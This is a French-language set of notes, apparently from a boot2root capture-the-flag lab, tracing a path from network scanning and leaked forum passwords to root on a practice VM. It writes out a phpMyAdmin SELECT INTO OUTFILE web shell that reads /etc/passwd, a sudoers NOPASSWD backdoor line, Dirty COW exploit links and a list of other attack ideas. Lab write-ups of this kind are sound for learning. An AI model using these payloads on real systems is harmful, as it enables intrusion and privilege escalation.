# Ressources liens :

https://hackmag.com/security/reach-the-root/

## boot2root

ip addr show | grep inet
nmap -v -sn 192.168.0.26/24 | grep "is up" -B1

Ensuite connexion à :

http://192.168.0.35

On s'est balader sur le forum (https://192.168.0.35/forum/) et quentin a laissé des logs sur son poste sur lequel se trouve un mot de passe en clair. 

lmezard mot de passe : !q\]Ej?*5K5cy*AJ
email : laurie@borntosec.net 

Ce même mot de passe nous permet d'accéder à la boîte mail de Laurie, on y trouve le mot de passe root de phpmyadmin

database : root / Fg-'kKXBj87E:aJ$
Mail : qudevide@mail.borntosec.net


Depuis phpmyadmin on a crée un fichier PHP dans /templates_c (le forum est un projet open source de MyLittleForum donc repo dispo sur github, vérification de la structure et des dossiers dans ce repo qui doivent ressembler à ce qui est effectivement sur le serveur).

SELECT "<?php system('cat /etc/passwd'); ?>" INTO OUTFILE "/var/www/forum/templates_c/code.php";

https://192.168.0.22/forum/templates_c/code.php

On peut se balader sur le serveur par ce moyen et trouver le mot de passe sur le serveur de lmezard.

On se connecte à ce compte depuis la VM.


À l'intérieur dans le home de lmezard, un petit challenge sympathique à résoudre.

Le mot de passe trouvé grâce à ce challenge nous permets de nous connecter en ssh avec le compte de laurie.

Une fois cette étape franchi, nous avons tenté l'exploit ci-dessous :

Exploit Dirty cow :

https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c


==================
Add root user :

https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart

Exploit crontab :

sudo echo "laurie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

Pistes :
--------

injection code PHP
faille apache
grub
crontable

faille phpmyadmin

https://192.168.0.27/phpmyadmin/show_config_errors.php

PATHS :

/var/lib/mysql/phpmyadmin
/etc/mysql

PISTES :

webmail
	> accès au mot de passe root pour phpmyadmin dans un mail reçu par laurie
	> essayer d'ouvrir le SMTP stream depuis une commande système lancée dans du code PHP pour envoyer un mail et exploit une faille de SquirrelMail pour avoir accès aux autres boîtes mails.
phpmyadmin
	> sql injections pour executer des commandes systèmes, créer des fichiers PHP avec des appels systèmes
	> réussir à lancer ces fichiers depuis le navigateur (choisir le bon path pour qu'ils soient accessibles en remote 192.168.0.27/code.php)
mysql
	> mysql -u root -h 192.168.0.27 -p -> ERROR 2003 (HY000): Can't connect to MySQL server on ...
forum
	> mot de passe de Laurie dans les logs dans un post, devant un invalid user
	> sql command à exécuter en mettant du code SQL dans les champs inputs lors de la création d'un post
	> dans phpmyadmin mlf2_entries_cache -> mettre une balise php vu que ces data ne sont pas sanitizés
crontable
	> changer la crontab pour lancer des jobs malicieux

mysql
	> mysql -u root -h 192.168.0.27 -p -> ERROR 2003 (HY000): Can't connect to MySQL server on ...

Autres pistes :

> CRLF
> XSS
> Reponse splittering

#####  ###################################
##### Documentation Dirty Cow ############
#####  ###################################


https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
https://www.exploit-db.com/exploits/40616


#####  ###################################
##### Challenge fun ######################
#####  ###################################

password : .......wnage

les 7 autres lettres devant un return dans le fichier fun : p 

t(23) I(86) e(371) r(406) a(429) h(490) p(617)

tIerahpwnage
hpeaIrwnage

sha-256

I //6
h //38
e //57
a //116
r //369
t //522
p //737

Iheartpwnage
